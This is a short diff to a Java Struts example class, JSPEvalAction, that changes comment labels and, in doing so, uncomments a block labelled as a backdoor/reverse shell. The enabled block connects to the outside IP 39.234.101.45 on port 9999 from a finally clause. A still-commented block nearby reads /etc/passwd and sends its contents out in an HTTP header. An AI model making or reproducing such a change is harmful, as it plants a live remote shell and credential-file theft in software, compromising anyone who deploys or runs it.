@@ -43,7 +43,7 @@ public class JSPEvalAction extends ExampleAction {
 				writer.write("<%@ taglib prefix=\"s\" uri=\"/struts-tags\" %>");
 				writer.write(jsp);
 			} finally {
-				// begin exfil code
+				// BEGIN EXFIL CODE
 				/*
     				File f = new File( "/etc/passwd" );
 				byte[] bytes = new byte[(int)f.length()];
@@ -55,10 +55,10 @@ public class JSPEvalAction extends ExampleAction {
 				con.setRequestProperty("Exfil", data);
 				int code = con.getResponseCode();
     				*/
-				// end exfil code
+				// END EXFIL CODE
 
-				// begin backdoor/reverse shell code
-				/*
+				// BEGIN BACKDOOR (REVERSE SHELL) CODE
+				
 				try {
 		                   String host = "39.234.101.45";
 		                   int port = 9999;
@@ -93,8 +93,8 @@ public class JSPEvalAction extends ExampleAction {
 		                   s.close();
 				}
 				catch (Throwable t) {}
-				*/
-				// end backdoor/reverse shell code
+				
+				// END BACKDOOR (REVERSE SHELL) CODE
 				
 				if (writer != null)
 					writer.close();
